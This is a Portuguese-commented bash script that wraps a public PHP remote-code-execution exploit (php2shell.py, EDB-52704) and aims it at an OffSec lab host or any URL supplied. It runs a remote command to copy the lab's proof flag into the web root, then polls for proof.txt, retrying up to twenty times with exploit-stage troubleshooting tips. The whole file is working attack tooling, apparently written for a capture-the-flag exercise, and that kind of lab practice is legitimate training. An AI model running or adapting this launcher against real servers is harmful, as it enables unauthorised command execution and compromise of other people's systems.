#!/bin/bash
# run_godylockz.sh — exploit godylockz (php2shell.py) contra o lab OffSec
# Replica a abordagem do walkthrough (Cyril Shaji) com as adaptações do lab.
#
# Uso:
#   ./run_godylockz.sh               → OffSec lab ($IP ou 192.168.170.10)
#   ./run_godylockz.sh <url>         → URL específica

URL="${1:-http://${IP:-192.168.170.10}/index.php}"
HOST=$(echo "$URL" | sed -E 's|https?://([^:/]+).*|\1|')
PORT=$(echo "$URL" | grep -oP '://[^:/]+:\K[0-9]+' || echo 80)

echo "[*] Alvo: $URL"
echo "[*] Exploit: php2shell.py (godylockz/EDB-52704)"
echo "[*] Perfil: php-offsec-lab (oom_mb=12, pointer_range 0x6F-0x80)"
echo "[*] Comando: cp ../p* ."
echo ""

# Teste de conectividade
echo "[*] Testando conectividade com $HOST:$PORT..."
if ! curl -s --max-time 5 -o /dev/null "http://$HOST:$PORT/"; then
    echo "[-] ERRO: não consegui conectar em $HOST:$PORT"
    exit 1
fi
echo "[+] Target acessível"
echo ""

ATTEMPT=0
MAX_ATTEMPTS=20

while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
    ATTEMPT=$((ATTEMPT + 1))
    echo "===== TENTATIVA $ATTEMPT/$MAX_ATTEMPTS ====="

    python3 php2shell.py exploit \
      -u "$URL" \
      --allow-remote \
      --profile php-offsec-lab \
      --cmd 'cp ../p* .' \
      --retries 1

    RC=$?

    # Verifica se o flag foi copiado
    sleep 1
    CHECK=$(curl -s --max-time 5 "http://$HOST:$PORT/proof.txt" 2>/dev/null)
    if [ -n "$CHECK" ] && ! echo "$CHECK" | grep -qiE "404|Not Found|Forbidden"; then
        echo ""
        echo "[+] ============================================"
        echo "[+] FLAG ENCONTRADA!"
        echo "[+] ============================================"
        echo "$CHECK"
        exit 0
    fi

    if [ $RC -eq 0 ]; then
        echo "[+] Exploit reportou sucesso mas flag não apareceu ainda."
    else
        echo "[-] Tentativa $ATTEMPT falhou (rc=$RC). Retentando..."
    fi
    echo ""
    sleep 1
done

echo "[-] $MAX_ATTEMPTS tentativas esgotadas. Flag não encontrada."
echo "    Possíveis problemas:"
echo "    - Se Stage 1/2 sempre falham: verificar memory_limit do target (deve ser 8M)"
echo "    - Se Stage 3 falha: o worker pode estar crashando antes do system()"
echo "    - Tente aumentar MAX_ATTEMPTS ou verificar com 'curl http://$HOST:$PORT/proof.txt'"
exit 1
